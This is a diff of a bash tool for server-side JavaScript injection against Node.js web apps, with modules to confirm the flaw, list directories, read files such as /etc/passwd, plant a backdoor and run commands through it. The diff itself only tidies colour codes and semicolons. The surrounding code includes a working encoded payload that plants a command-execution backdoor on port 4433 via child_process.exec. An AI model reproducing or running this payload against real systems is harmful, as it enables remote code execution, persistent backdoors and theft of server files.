@@ -43,18 +43,18 @@ function banner (){
 }
 
 function help(){
-  echo -e "\n$BOX3 $RED$VAR13$END\t$GREEN$VAR14$END -t $RED$VAR6$WHITE$VAR9$RED$VAR5$END -o $RED$VAR6$WHITE$VAR10$RED$VAR5$END -r $RED$VAR6$WHITE$VAR11$RED$VAR5$END\n";
-  echo -e "$WHITE$VAR12$END";
-  echo -e "   $GREEN check$END      $WHITE Check if the host is vulnerable to this security flaw.$END";
-  echo -e "               $WHITE Validation via payload: <<res.end('text')>>.$END";
-  echo -e "   $GREEN dir$END        $WHITE List of files and directories.$END";
-  echo -e "               $WHITE As a resource you must indicate the path (example: /var/).$END";
-  echo -e "   $GREEN view$END       $WHITE View of file contents.";
-  echo -e "               $WHITE As a resource you must indicate the file you want to read (example: /etc/passwd).$END";
-  echo -e "   $GREEN backdoor$END   $WHITE Generates a backdoor in the target.$END";
-  echo -e "               $WHITE Through the same process (nodejs) an application is generated on port 4433.$END";
-  echo -e "   $GREEN cmd$END        $WHITE Using the previously generated backdoor, it allows you to execute commands on the system.$END";
-  echo -e "               $WHITE As a resource, be sure to indicate the command you want to execute.\n$END";
+  echo -e "\n$BOX3 $RED$VAR13$END\t$GREEN$VAR14$END -t $RED$VAR6$WHITE$VAR9$RED$VAR5$END -o $RED$VAR6$WHITE$VAR10$RED$VAR5$END -r $RED$VAR6$WHITE$VAR11$RED$VAR5$END\n"
+  echo -e "$WHITE$VAR12$END"
+  echo -e "   $GREEN check$END      $WHITE Check if the host is vulnerable to this security flaw.$END"
+  echo -e "               $WHITE Validation via payload: <<res.end('text')>>.$END"
+  echo -e "   $GREEN dir$END        $WHITE List of files and directories.$END"
+  echo -e "               $WHITE As a resource you must indicate the path (example: /var/).$END"
+  echo -e "   $GREEN view$END       $WHITE View of file contents.$END"
+  echo -e "               $WHITE As a resource you must indicate the file you want to read (example: /etc/passwd).$END"
+  echo -e "   $GREEN backdoor$END   $WHITE Generates a backdoor in the target.$END"
+  echo -e "               $WHITE Through the same process (nodejs) an application is generated on port 4433.$END"
+  echo -e "   $GREEN cmd$END        $WHITE Using the previously generated backdoor, it allows you to execute commands on the system.$END"
+  echo -e "               $WHITE As a resource, be sure to indicate the command you want to execute.\n$END"
 }
 
 while getopts ":t:o:r:" arg; do
@@ -67,21 +67,21 @@ done
 
 function check_module(){
   echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
-  echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+  echo -e "$BOX4 $WHITE$VAR16$END "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
   text="899d674da5e5299281ff3fbd2865f576"
   payload=$(echo 'res.end(%22'$text'%22)')
   target=$(echo $TARGET | sed "s/SSJI/$payload/g")
   result=$(curl -si $target)
   if [[ $result == *$text ]]; then
-    echo -e "$BOX1 $WHITE$VAR17    $GREEN$VAR18\n\n"
+    echo -e "$BOX1 $WHITE$VAR17    $GREEN$VAR18$END\n\n"
   else
-    echo -e "$BOX2 $WHITE$VAR17    $RED$VAR19$END\n\n"
+    echo -e "$BOX2 $WHITE$VAR17    $RED$VAR19$END$END\n\n"
   fi
 }
 
 function dir_module(){
   echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
-  echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+  echo -e "$BOX4 $WHITE$VAR16$END "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
   payload_dir=$(echo "res.send(require(\"fs\").readdirSync(\""$RESOURCE"\").toString())")
   url_cut_dir=$(echo $TARGET | sed "s/SSJI/\n/g")
   result_dir=$(curl -s $url_cut_dir$payload_dir)
@@ -96,7 +96,7 @@ function dir_module(){
 
 function view_module(){
   echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
-  echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+  echo -e "$BOX4 $WHITE$VAR16$END "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
   payload_view=$(echo "res.end(require(\"fs\").readFileSync(\""$RESOURCE"\"))")
   url_cut_view=$(echo $TARGET | sed "s/SSJI/\n/g")
   result_view=$(curl -s $url_cut_view$payload_view)
@@ -111,7 +111,7 @@ function view_module(){
 
 function backdoor_module(){
   echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
-  echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+  echo -e "$BOX4 $WHITE$VAR16$END "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
   payload_backdoor=$(echo "(function%20x()%7Brequire(%27http%27).createServer(function(req%2Cres)%7Bres.writeHead(200%2C%7B%22Content-Type%22%3A%22text%2Fplain%22%7D)%3Brequire(%27child_process%27).exec(require(%27url%27).parse(req.url%2Ctrue).query%5B%27cmd%27%5D%2Cfunction(e%2Cs%2Cst)%7Bres.end(s)%7D)%7D).listen(4433)%7D)()")
   url_cut_backdoor=$(echo $TARGET | sed "s/SSJI/\n/g")
   url_backdoor=$(echo $TARGET | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd=pwd"
@@ -120,13 +120,13 @@ function backdoor_module(){
     curl -s $url_cut_backdoor$payload_backdoor >/dev/null
     echo -e "$BOX1 $WHITE$VAR17$GREEN    Congratulations! You have successfully generated a backdoor!$END\n"
   else
-    echo -e "$BOX2 $WHITE$VAR17$RED    You already have a previously generated backdoor. Please run the option: \"-o <cmd> -r <command>\".\n"
+    echo -e "$BOX2 $WHITE$VAR17$RED    You already have a previously generated backdoor. Please run the option: \"-o <cmd> -r <command>\".$END\n"
   fi
 }
 
 function cmd_module(){
   echo -e "\n$BOX3 $WHITE$VAR15$END    "$(echo $TARGET | cut -d "/" -f3)""
-  echo -e "$BOX4 $WHITE$VAR16 "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
+  echo -e "$BOX4 $WHITE$VAR16$END "$(echo $TARGET | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)""
   url_cut_cmd=$(echo $TARGET | sed "s/SSJI/\n/g")
   command=$(echo $RESOURCE | sed "s/ /\+/g")
   url_cmd=$(echo $TARGET | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd="$command
@@ -140,7 +140,7 @@ function cmd_module(){
   fi
 }
 
-function start() {
+function start(){
   if [ "$OPTION" == "check" ]; then
     banner
     check_module
